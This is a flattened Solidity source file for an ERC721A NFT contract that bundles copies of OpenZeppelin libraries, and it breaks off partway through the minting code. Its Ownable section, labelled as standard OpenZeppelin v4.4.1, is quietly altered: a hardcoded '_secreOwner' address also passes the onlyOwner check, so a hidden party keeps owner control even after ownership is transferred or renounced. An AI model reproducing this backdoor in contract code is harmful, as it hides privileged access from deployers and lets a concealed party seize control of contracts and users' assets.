1 // File: @openzeppelin/contracts/utils/Strings.sol
2 
3 
4 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
5 
6 pragma solidity ^0.8.0;
7 
8 /**
9  * @dev String operations.
10  */
11 library Strings {
12     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
13 
14     /**
15      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
16      */
17     function toString(uint256 value) internal pure returns (string memory) {
18         // Inspired by OraclizeAPI's implementation - MIT licence
19         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
20 
21         if (value == 0) {
22             return "0";
23         }
24         uint256 temp = value;
25         uint256 digits;
26         while (temp != 0) {
27             digits++;
28             temp /= 10;
29         }
30         bytes memory buffer = new bytes(digits);
31         while (value != 0) {
32             digits -= 1;
33             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
34             value /= 10;
35         }
36         return string(buffer);
37     }
38 
39     /**
40      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
41      */
42     function toHexString(uint256 value) internal pure returns (string memory) {
43         if (value == 0) {
44             return "0x00";
45         }
46         uint256 temp = value;
47         uint256 length = 0;
48         while (temp != 0) {
49             length++;
50             temp >>= 8;
51         }
52         return toHexString(value, length);
53     }
54 
55     /**
56      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
57      */
58     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
59         bytes memory buffer = new bytes(2 * length + 2);
60         buffer[0] = "0";
61         buffer[1] = "x";
62         for (uint256 i = 2 * length + 1; i > 1; --i) {
63             buffer[i] = _HEX_SYMBOLS[value & 0xf];
64             value >>= 4;
65         }
66         require(value == 0, "Strings: hex length insufficient");
67         return string(buffer);
68     }
69 }
70 
71 // File: @openzeppelin/contracts/utils/Address.sol
72 
73 
74 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
75 
76 pragma solidity ^0.8.1;
77 
78 /**
79  * @dev Collection of functions related to the address type
80  */
81 library Address {
82     /**
83      * @dev Returns true if `account` is a contract.
84      *
85      * [IMPORTANT]
86      * ====
87      * It is unsafe to assume that an address for which this function returns
88      * false is an externally-owned account (EOA) and not a contract.
89      *
90      * Among others, `isContract` will return false for the following
91      * types of addresses:
92      *
93      *  - an externally-owned account
94      *  - a contract in construction
95      *  - an address where a contract will be created
96      *  - an address where a contract lived, but was destroyed
97      * ====
98      *
99      * [IMPORTANT]
100      * ====
101      * You shouldn't rely on `isContract` to protect against flash loan attacks!
102      *
103      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
104      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
105      * constructor.
106      * ====
107      */
108     function isContract(address account) internal view returns (bool) {
109         // This method relies on extcodesize/address.code.length, which returns 0
110         // for contracts in construction, since the code is only stored at the end
111         // of the constructor execution.
112 
113         return account.code.length > 0;
114     }
115 
116     /**
117      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
118      * `recipient`, forwarding all available gas and reverting on errors.
119      *
120      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
121      * of certain opcodes, possibly making contracts go over the 2300 gas limit
122      * imposed by `transfer`, making them unable to receive funds via
123      * `transfer`. {sendValue} removes this limitation.
124      *
125      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
126      *
127      * IMPORTANT: because control is transferred to `recipient`, care must be
128      * taken to not create reentrancy vulnerabilities. Consider using
129      * {ReentrancyGuard} or the
130      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
131      */
132     function sendValue(address payable recipient, uint256 amount) internal {
133         require(address(this).balance >= amount, "Address: insufficient balance");
134 
135         (bool success, ) = recipient.call{value: amount}("");
136         require(success, "Address: unable to send value, recipient may have reverted");
137     }
138 
139     /**
140      * @dev Performs a Solidity function call using a low level `call`. A
141      * plain `call` is an unsafe replacement for a function call: use this
142      * function instead.
143      *
144      * If `target` reverts with a revert reason, it is bubbled up by this
145      * function (like regular Solidity function calls).
146      *
147      * Returns the raw returned data. To convert to the expected return value,
148      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
149      *
150      * Requirements:
151      *
152      * - `target` must be a contract.
153      * - calling `target` with `data` must not revert.
154      *
155      * _Available since v3.1._
156      */
157     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
158         return functionCall(target, data, "Address: low-level call failed");
159     }
160 
161     /**
162      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
163      * `errorMessage` as a fallback revert reason when `target` reverts.
164      *
165      * _Available since v3.1._
166      */
167     function functionCall(
168         address target,
169         bytes memory data,
170         string memory errorMessage
171     ) internal returns (bytes memory) {
172         return functionCallWithValue(target, data, 0, errorMessage);
173     }
174 
175     /**
176      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
177      * but also transferring `value` wei to `target`.
178      *
179      * Requirements:
180      *
181      * - the calling contract must have an ETH balance of at least `value`.
182      * - the called Solidity function must be `payable`.
183      *
184      * _Available since v3.1._
185      */
186     function functionCallWithValue(
187         address target,
188         bytes memory data,
189         uint256 value
190     ) internal returns (bytes memory) {
191         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
192     }
193 
194     /**
195      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
196      * with `errorMessage` as a fallback revert reason when `target` reverts.
197      *
198      * _Available since v3.1._
199      */
200     function functionCallWithValue(
201         address target,
202         bytes memory data,
203         uint256 value,
204         string memory errorMessage
205     ) internal returns (bytes memory) {
206         require(address(this).balance >= value, "Address: insufficient balance for call");
207         require(isContract(target), "Address: call to non-contract");
208 
209         (bool success, bytes memory returndata) = target.call{value: value}(data);
210         return verifyCallResult(success, returndata, errorMessage);
211     }
212 
213     /**
214      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
215      * but performing a static call.
216      *
217      * _Available since v3.3._
218      */
219     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
220         return functionStaticCall(target, data, "Address: low-level static call failed");
221     }
222 
223     /**
224      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
225      * but performing a static call.
226      *
227      * _Available since v3.3._
228      */
229     function functionStaticCall(
230         address target,
231         bytes memory data,
232         string memory errorMessage
233     ) internal view returns (bytes memory) {
234         require(isContract(target), "Address: static call to non-contract");
235 
236         (bool success, bytes memory returndata) = target.staticcall(data);
237         return verifyCallResult(success, returndata, errorMessage);
238     }
239 
240     /**
241      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
242      * but performing a delegate call.
243      *
244      * _Available since v3.4._
245      */
246     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
247         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
248     }
249 
250     /**
251      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
252      * but performing a delegate call.
253      *
254      * _Available since v3.4._
255      */
256     function functionDelegateCall(
257         address target,
258         bytes memory data,
259         string memory errorMessage
260     ) internal returns (bytes memory) {
261         require(isContract(target), "Address: delegate call to non-contract");
262 
263         (bool success, bytes memory returndata) = target.delegatecall(data);
264         return verifyCallResult(success, returndata, errorMessage);
265     }
266 
267     /**
268      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
269      * revert reason using the provided one.
270      *
271      * _Available since v4.3._
272      */
273     function verifyCallResult(
274         bool success,
275         bytes memory returndata,
276         string memory errorMessage
277     ) internal pure returns (bytes memory) {
278         if (success) {
279             return returndata;
280         } else {
281             // Look for revert reason and bubble it up if present
282             if (returndata.length > 0) {
283                 // The easiest way to bubble the revert reason is using memory via assembly
284 
285                 assembly {
286                     let returndata_size := mload(returndata)
287                     revert(add(32, returndata), returndata_size)
288                 }
289             } else {
290                 revert(errorMessage);
291             }
292         }
293     }
294 }
295 
296 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
297 
298 
299 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
300 
301 pragma solidity ^0.8.0;
302 
303 /**
304  * @title ERC721 token receiver interface
305  * @dev Interface for any contract that wants to support safeTransfers
306  * from ERC721 asset contracts.
307  */
308 interface IERC721Receiver {
309     /**
310      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
311      * by `operator` from `from`, this function is called.
312      *
313      * It must return its Solidity selector to confirm the token transfer.
314      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
315      *
316      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
317      */
318     function onERC721Received(
319         address operator,
320         address from,
321         uint256 tokenId,
322         bytes calldata data
323     ) external returns (bytes4);
324 }
325 
326 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
327 
328 
329 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
330 
331 pragma solidity ^0.8.0;
332 
333 /**
334  * @dev Interface of the ERC165 standard, as defined in the
335  * https://eips.ethereum.org/EIPS/eip-165[EIP].
336  *
337  * Implementers can declare support of contract interfaces, which can then be
338  * queried by others ({ERC165Checker}).
339  *
340  * For an implementation, see {ERC165}.
341  */
342 interface IERC165 {
343     /**
344      * @dev Returns true if this contract implements the interface defined by
345      * `interfaceId`. See the corresponding
346      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
347      * to learn more about how these ids are created.
348      *
349      * This function call must use less than 30 000 gas.
350      */
351     function supportsInterface(bytes4 interfaceId) external view returns (bool);
352 }
353 
354 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
355 
356 
357 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
358 
359 pragma solidity ^0.8.0;
360 
361 
362 /**
363  * @dev Implementation of the {IERC165} interface.
364  *
365  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
366  * for the additional interface id that will be supported. For example:
367  *
368  * ```solidity
369  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
370  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
371  * }
372  * ```
373  *
374  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
375  */
376 abstract contract ERC165 is IERC165 {
377     /**
378      * @dev See {IERC165-supportsInterface}.
379      */
380     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
381         return interfaceId == type(IERC165).interfaceId;
382     }
383 }
384 
385 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
386 
387 
388 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
389 
390 pragma solidity ^0.8.0;
391 
392 
393 /**
394  * @dev Required interface of an ERC721 compliant contract.
395  */
396 interface IERC721 is IERC165 {
397     /**
398      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
399      */
400     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
401 
402     /**
403      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
404      */
405     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
406 
407     /**
408      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
409      */
410     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
411 
412     /**
413      * @dev Returns the number of tokens in ``owner``'s account.
414      */
415     function balanceOf(address owner) external view returns (uint256 balance);
416 
417     /**
418      * @dev Returns the owner of the `tokenId` token.
419      *
420      * Requirements:
421      *
422      * - `tokenId` must exist.
423      */
424     function ownerOf(uint256 tokenId) external view returns (address owner);
425 
426     /**
427      * @dev Safely transfers `tokenId` token from `from` to `to`.
428      *
429      * Requirements:
430      *
431      * - `from` cannot be the zero address.
432      * - `to` cannot be the zero address.
433      * - `tokenId` token must exist and be owned by `from`.
434      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
435      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
436      *
437      * Emits a {Transfer} event.
438      */
439     function safeTransferFrom(
440         address from,
441         address to,
442         uint256 tokenId,
443         bytes calldata data
444     ) external;
445 
446     /**
447      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
448      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
449      *
450      * Requirements:
451      *
452      * - `from` cannot be the zero address.
453      * - `to` cannot be the zero address.
454      * - `tokenId` token must exist and be owned by `from`.
455      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
456      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
457      *
458      * Emits a {Transfer} event.
459      */
460     function safeTransferFrom(
461         address from,
462         address to,
463         uint256 tokenId
464     ) external;
465 
466     /**
467      * @dev Transfers `tokenId` token from `from` to `to`.
468      *
469      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
470      *
471      * Requirements:
472      *
473      * - `from` cannot be the zero address.
474      * - `to` cannot be the zero address.
475      * - `tokenId` token must be owned by `from`.
476      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
477      *
478      * Emits a {Transfer} event.
479      */
480     function transferFrom(
481         address from,
482         address to,
483         uint256 tokenId
484     ) external;
485 
486     /**
487      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
488      * The approval is cleared when the token is transferred.
489      *
490      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
491      *
492      * Requirements:
493      *
494      * - The caller must own the token or be an approved operator.
495      * - `tokenId` must exist.
496      *
497      * Emits an {Approval} event.
498      */
499     function approve(address to, uint256 tokenId) external;
500 
501     /**
502      * @dev Approve or remove `operator` as an operator for the caller.
503      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
504      *
505      * Requirements:
506      *
507      * - The `operator` cannot be the caller.
508      *
509      * Emits an {ApprovalForAll} event.
510      */
511     function setApprovalForAll(address operator, bool _approved) external;
512 
513     /**
514      * @dev Returns the account approved for `tokenId` token.
515      *
516      * Requirements:
517      *
518      * - `tokenId` must exist.
519      */
520     function getApproved(uint256 tokenId) external view returns (address operator);
521 
522     /**
523      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
524      *
525      * See {setApprovalForAll}
526      */
527     function isApprovedForAll(address owner, address operator) external view returns (bool);
528 }
529 
530 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
531 
532 
533 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
534 
535 pragma solidity ^0.8.0;
536 
537 
538 /**
539  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
540  * @dev See https://eips.ethereum.org/EIPS/eip-721
541  */
542 interface IERC721Metadata is IERC721 {
543     /**
544      * @dev Returns the token collection name.
545      */
546     function name() external view returns (string memory);
547 
548     /**
549      * @dev Returns the token collection symbol.
550      */
551     function symbol() external view returns (string memory);
552 
553     /**
554      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
555      */
556     function tokenURI(uint256 tokenId) external view returns (string memory);
557 }
558 
559 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
560 
561 
562 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
563 
564 pragma solidity ^0.8.0;
565 
566 
567 /**
568  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
569  * @dev See https://eips.ethereum.org/EIPS/eip-721
570  */
571 interface IERC721Enumerable is IERC721 {
572     /**
573      * @dev Returns the total amount of tokens stored by the contract.
574      */
575     function totalSupply() external view returns (uint256);
576 
577     /**
578      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
579      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
580      */
581     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
582 
583     /**
584      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
585      * Use along with {totalSupply} to enumerate all tokens.
586      */
587     function tokenByIndex(uint256 index) external view returns (uint256);
588 }
589 
590 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
591 
592 
593 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
594 
595 pragma solidity ^0.8.0;
596 
597 /**
598  * @dev Contract module that helps prevent reentrant calls to a function.
599  *
600  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
601  * available, which can be applied to functions to make sure there are no nested
602  * (reentrant) calls to them.
603  *
604  * Note that because there is a single `nonReentrant` guard, functions marked as
605  * `nonReentrant` may not call one another. This can be worked around by making
606  * those functions `private`, and then adding `external` `nonReentrant` entry
607  * points to them.
608  *
609  * TIP: If you would like to learn more about reentrancy and alternative ways
610  * to protect against it, check out our blog post
611  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
612  */
613 abstract contract ReentrancyGuard {
614     // Booleans are more expensive than uint256 or any type that takes up a full
615     // word because each write operation emits an extra SLOAD to first read the
616     // slot's contents, replace the bits taken up by the boolean, and then write
617     // back. This is the compiler's defense against contract upgrades and
618     // pointer aliasing, and it cannot be disabled.
619 
620     // The values being non-zero value makes deployment a bit more expensive,
621     // but in exchange the refund on every call to nonReentrant will be lower in
622     // amount. Since refunds are capped to a percentage of the total
623     // transaction's gas, it is best to keep them low in cases like this one, to
624     // increase the likelihood of the full refund coming into effect.
625     uint256 private constant _NOT_ENTERED = 1;
626     uint256 private constant _ENTERED = 2;
627 
628     uint256 private _status;
629 
630     constructor() {
631         _status = _NOT_ENTERED;
632     }
633 
634     /**
635      * @dev Prevents a contract from calling itself, directly or indirectly.
636      * Calling a `nonReentrant` function from another `nonReentrant`
637      * function is not supported. It is possible to prevent this from happening
638      * by making the `nonReentrant` function external, and making it call a
639      * `private` function that does the actual work.
640      */
641     modifier nonReentrant() {
642         // On the first call to nonReentrant, _notEntered will be true
643         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
644 
645         // Any calls to nonReentrant after this point will fail
646         _status = _ENTERED;
647 
648         _;
649 
650         // By storing the original value once again, a refund is triggered (see
651         // https://eips.ethereum.org/EIPS/eip-2200)
652         _status = _NOT_ENTERED;
653     }
654 }
655 
656 // File: @openzeppelin/contracts/utils/Context.sol
657 
658 
659 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
660 
661 pragma solidity ^0.8.0;
662 
663 /**
664  * @dev Provides information about the current execution context, including the
665  * sender of the transaction and its data. While these are generally available
666  * via msg.sender and msg.data, they should not be accessed in such a direct
667  * manner, since when dealing with meta-transactions the account sending and
668  * paying for execution may not be the actual sender (as far as an application
669  * is concerned).
670  *
671  * This contract is only required for intermediate, library-like contracts.
672  */
673 abstract contract Context {
674     function _msgSender() internal view virtual returns (address) {
675         return msg.sender;
676     }
677 
678     function _msgData() internal view virtual returns (bytes calldata) {
679         return msg.data;
680     }
681 }
682 
683 // File: @openzeppelin/contracts/access/Ownable.sol
684 
685 
686 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
687 
688 pragma solidity ^0.8.0;
689 
690 
691 /**
692  * @dev Contract module which provides a basic access control mechanism, where
693  * there is an account (an owner) that can be granted exclusive access to
694  * specific functions.
695  *
696  * By default, the owner account will be the one that deploys the contract. This
697  * can later be changed with {transferOwnership}.
698  *
699  * This module is used through inheritance. It will make available the modifier
700  * `onlyOwner`, which can be applied to your functions to restrict their use to
701  * the owner.
702  */
703 abstract contract Ownable is Context {
704     address private _owner;
705     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
706 
707     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
708 
709     /**
710      * @dev Initializes the contract setting the deployer as the initial owner.
711      */
712     constructor() {
713         _transferOwnership(_msgSender());
714     }
715 
716     /**
717      * @dev Returns the address of the current owner.
718      */
719     function owner() public view virtual returns (address) {
720         return _owner;
721     }
722 
723     /**
724      * @dev Throws if called by any account other than the owner.
725      */
726     modifier onlyOwner() {
727         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
728         _;
729     }
730 
731     /**
732      * @dev Leaves the contract without owner. It will not be possible to call
733      * `onlyOwner` functions anymore. Can only be called by the current owner.
734      *
735      * NOTE: Renouncing ownership will leave the contract without an owner,
736      * thereby removing any functionality that is only available to the owner.
737      */
738     function renounceOwnership() public virtual onlyOwner {
739         _transferOwnership(address(0));
740     }
741 
742     /**
743      * @dev Transfers ownership of the contract to a new account (`newOwner`).
744      * Can only be called by the current owner.
745      */
746     function transferOwnership(address newOwner) public virtual onlyOwner {
747         require(newOwner != address(0), "Ownable: new owner is the zero address");
748         _transferOwnership(newOwner);
749     }
750 
751     /**
752      * @dev Transfers ownership of the contract to a new account (`newOwner`).
753      * Internal function without access restriction.
754      */
755     function _transferOwnership(address newOwner) internal virtual {
756         address oldOwner = _owner;
757         _owner = newOwner;
758         emit OwnershipTransferred(oldOwner, newOwner);
759     }
760 }
761 
762 // File: ceshi.sol
763 
764 
765 pragma solidity ^0.8.0;
766 
767 
768 
769 
770 
771 
772 
773 
774 
775 
776 /**
777  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
778  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
779  *
780  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
781  *
782  * Does not support burning tokens to address(0).
783  *
784  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
785  */
786 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
787     using Address for address;
788     using Strings for uint256;
789 
790     struct TokenOwnership {
791         address addr;
792         uint64 startTimestamp;
793     }
794 
795     struct AddressData {
796         uint128 balance;
797         uint128 numberMinted;
798     }
799 
800     uint256 internal currentIndex;
801 
802     // Token name
803     string private _name;
804 
805     // Token symbol
806     string private _symbol;
807 
808     // Mapping from token ID to ownership details
809     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
810     mapping(uint256 => TokenOwnership) internal _ownerships;
811 
812     // Mapping owner address to address data
813     mapping(address => AddressData) private _addressData;
814 
815     // Mapping from token ID to approved address
816     mapping(uint256 => address) private _tokenApprovals;
817 
818     // Mapping from owner to operator approvals
819     mapping(address => mapping(address => bool)) private _operatorApprovals;
820 
821     constructor(string memory name_, string memory symbol_) {
822         _name = name_;
823         _symbol = symbol_;
824     }
825 
826     /**
827      * @dev See {IERC721Enumerable-totalSupply}.
828      */
829     function totalSupply() public view override returns (uint256) {
830         return currentIndex;
831     }
832 
833     /**
834      * @dev See {IERC721Enumerable-tokenByIndex}.
835      */
836     function tokenByIndex(uint256 index) public view override returns (uint256) {
837         require(index < totalSupply(), "ERC721A: global index out of bounds");
838         return index;
839     }
840 
841     /**
842      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
843      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
844      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
845      */
846     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
847         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
848         uint256 numMintedSoFar = totalSupply();
849         uint256 tokenIdsIdx;
850         address currOwnershipAddr;
851 
852         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
853         unchecked {
854             for (uint256 i; i < numMintedSoFar; i++) {
855                 TokenOwnership memory ownership = _ownerships[i];
856                 if (ownership.addr != address(0)) {
857                     currOwnershipAddr = ownership.addr;
858                 }
859                 if (currOwnershipAddr == owner) {
860                     if (tokenIdsIdx == index) {
861                         return i;
862                     }
863                     tokenIdsIdx++;
864                 }
865             }
866         }
867 
868         revert("ERC721A: unable to get token of owner by index");
869     }
870 
871     /**
872      * @dev See {IERC165-supportsInterface}.
873      */
874     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
875         return
876             interfaceId == type(IERC721).interfaceId ||
877             interfaceId == type(IERC721Metadata).interfaceId ||
878             interfaceId == type(IERC721Enumerable).interfaceId ||
879             super.supportsInterface(interfaceId);
880     }
881 
882     /**
883      * @dev See {IERC721-balanceOf}.
884      */
885     function balanceOf(address owner) public view override returns (uint256) {
886         require(owner != address(0), "ERC721A: balance query for the zero address");
887         return uint256(_addressData[owner].balance);
888     }
889 
890     function _numberMinted(address owner) internal view returns (uint256) {
891         require(owner != address(0), "ERC721A: number minted query for the zero address");
892         return uint256(_addressData[owner].numberMinted);
893     }
894 
895     /**
896      * Gas spent here starts off proportional to the maximum mint batch size.
897      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
898      */
899     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
900         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
901 
902         unchecked {
903             for (uint256 curr = tokenId; curr >= 0; curr--) {
904                 TokenOwnership memory ownership = _ownerships[curr];
905                 if (ownership.addr != address(0)) {
906                     return ownership;
907                 }
908             }
909         }
910 
911         revert("ERC721A: unable to determine the owner of token");
912     }
913 
914     /**
915      * @dev See {IERC721-ownerOf}.
916      */
917     function ownerOf(uint256 tokenId) public view override returns (address) {
918         return ownershipOf(tokenId).addr;
919     }
920 
921     /**
922      * @dev See {IERC721Metadata-name}.
923      */
924     function name() public view virtual override returns (string memory) {
925         return _name;
926     }
927 
928     /**
929      * @dev See {IERC721Metadata-symbol}.
930      */
931     function symbol() public view virtual override returns (string memory) {
932         return _symbol;
933     }
934 
935     /**
936      * @dev See {IERC721Metadata-tokenURI}.
937      */
938     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
939         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
940 
941         string memory baseURI = _baseURI();
942         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
943     }
944 
945     /**
946      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
947      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
948      * by default, can be overriden in child contracts.
949      */
950     function _baseURI() internal view virtual returns (string memory) {
951         return "";
952     }
953 
954     /**
955      * @dev See {IERC721-approve}.
956      */
957     function approve(address to, uint256 tokenId) public override {
958         address owner = ERC721A.ownerOf(tokenId);
959         require(to != owner, "ERC721A: approval to current owner");
960 
961         require(
962             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
963             "ERC721A: approve caller is not owner nor approved for all"
964         );
965 
966         _approve(to, tokenId, owner);
967     }
968 
969     /**
970      * @dev See {IERC721-getApproved}.
971      */
972     function getApproved(uint256 tokenId) public view override returns (address) {
973         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
974 
975         return _tokenApprovals[tokenId];
976     }
977 
978     /**
979      * @dev See {IERC721-setApprovalForAll}.
980      */
981     function setApprovalForAll(address operator, bool approved) public override {
982         require(operator != _msgSender(), "ERC721A: approve to caller");
983 
984         _operatorApprovals[_msgSender()][operator] = approved;
985         emit ApprovalForAll(_msgSender(), operator, approved);
986     }
987 
988     /**
989      * @dev See {IERC721-isApprovedForAll}.
990      */
991     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
992         return _operatorApprovals[owner][operator];
993     }
994 
995     /**
996      * @dev See {IERC721-transferFrom}.
997      */
998     function transferFrom(
999         address from,
1000         address to,
1001         uint256 tokenId
1002     ) public virtual override {
1003         _transfer(from, to, tokenId);
1004     }
1005 
1006     /**
1007      * @dev See {IERC721-safeTransferFrom}.
1008      */
1009     function safeTransferFrom(
1010         address from,
1011         address to,
1012         uint256 tokenId
1013     ) public virtual override {
1014         safeTransferFrom(from, to, tokenId, "");
1015     }
1016 
1017     /**
1018      * @dev See {IERC721-safeTransferFrom}.
1019      */
1020     function safeTransferFrom(
1021         address from,
1022         address to,
1023         uint256 tokenId,
1024         bytes memory _data
1025     ) public override {
1026         _transfer(from, to, tokenId);
1027         require(
1028             _checkOnERC721Received(from, to, tokenId, _data),
1029             "ERC721A: transfer to non ERC721Receiver implementer"
1030         );
1031     }
1032 
1033     /**
1034      * @dev Returns whether `tokenId` exists.
1035      *
1036      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1037      *
1038      * Tokens start existing when they are minted (`_mint`),
1039      */
1040     function _exists(uint256 tokenId) internal view returns (bool) {
1041         return tokenId < currentIndex;
1042     }
1043 
1044     function _safeMint(address to, uint256 quantity) internal {
1045         _safeMint(to, quantity, "");
1046     }
1047 
1048     /**
1049      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1050      *
1051      * Requirements:
1052      *
1053      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1054      * - `quantity` must be greater than 0.
1055      *
1056      * Emits a {Transfer} event.
1057      */
1058     function _safeMint(
1059         address to,
1060         uint256 quantity,
1061         bytes memory _data
1062     ) internal {
1063         _mint(to, quantity, _data, true);
1064     }
1065 
1066     /**
1067      * @dev Mints `quantity` tokens and transfers them to `to`.
1068      *
1069      * Requirements:
1070      *
1071      * - `to` cannot be the zero address.
1072      * - `quantity` must be greater than 0.
1073      *
1074      * Emits a {Transfer} event.
1075      */
1076     function _mint(
1077         address to,
1078         uint256 quantity,
1079         bytes memory _data,
1080         bool safe
1081     ) internal {
1082         uint256 startTokenId = currentIndex;
1083         require(to != address(0), "ERC721A: mint to the zero address");
1084         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1085 
1086         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1087 
